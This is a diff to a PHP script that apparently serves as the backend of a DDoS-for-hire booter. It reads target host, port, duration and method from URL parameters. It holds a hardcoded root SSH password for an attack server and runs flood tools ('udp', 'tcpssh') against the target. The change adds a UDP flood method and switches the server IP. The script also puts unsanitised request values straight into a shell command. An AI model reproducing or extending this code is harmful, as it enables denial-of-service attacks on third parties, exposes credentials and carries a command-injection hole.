@@ -10,7 +10,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     $key = $_GET['key'];
 
     $username = 'root';
-    $ip = '152.42.203.209';
+    $ip = '103.253.146.18';
     $ports = '22';
     $password = 'leo@123';
 
@@ -21,6 +21,9 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
     }
 
     switch ($method) {
+        case 'UDP':
+            $command = "cd /var/www/html/test/ && screen -dm ./udp $host $port $time";
+            break;
         case 'TCPSSH':
             $command = "cd /var/www/html/test/ && screen -dm node tcpssh $host $port root $time";
             break;
